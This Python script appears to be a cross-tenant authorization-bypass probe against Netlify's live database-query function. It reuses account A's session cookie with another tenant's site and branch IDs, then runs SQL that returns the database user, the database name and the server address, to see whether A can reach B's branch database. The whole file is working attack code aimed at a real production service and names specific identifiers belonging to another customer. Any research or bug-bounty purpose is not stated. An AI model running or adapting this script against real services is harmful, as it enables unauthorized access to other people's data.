# -*- coding: utf-8 -*-
"""branchId 维度越权测试(database-query)
A cookie + siteId=A + branchId=<B 的 agent 分支>  -> 是否可连 B 的分支库
对照组:自己 site 的 production
"""
import http.client, ssl, gzip, brotli, json, time, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, SITE_A

SITE_B = 'd2977de0-d24d-4544-81cb-933e610cad7d'
BRANCH_B = 'agent-6a98d5e6448c07a76d7babf3'  # B 的分支(独立 endpoint ep-cold-unit-ae9s4l3i)
ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def q(site_id, branch_id, sql, cookie=COOKIE_A, action='query'):
    t0 = time.time()
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=40)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': cookie,
         'Content-Type': 'application/json'}
    body = {'siteId': site_id, 'action': action, 'sql': sql}
    if branch_id:
        body['branchId'] = branch_id
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:3000].decode('utf-8', 'ignore')
    conn.close()
    return st, out, round(time.time() - t0, 1)


SQL = "select current_user::text as u, current_database()::text as db, inet_server_addr()::text as srv"

cases = [
    ('A_site+B_branch', SITE_A, BRANCH_B, SQL),
    ('A_site+A_prod  ', SITE_A, 'production', SQL),
    ('A_site+B_branch2', SITE_A, 'agent-6a98d6d818790895d7d5ac00', SQL),
    ('B_site+B_prod  ', SITE_B, 'production', SQL, COOKIE_A),  # 对照:site 越权仍应 401
]
for name, sid, bid, sql in cases:
    ck = cases[-1][4] if name == 'B_site+B_prod  ' else COOKIE_A
    st, out, dt = q(sid, bid, sql, cookie=ck)
    print('%-16s [%d] %.1fs' % (name, st, dt))
    print('   ' + out[:800])
    print()
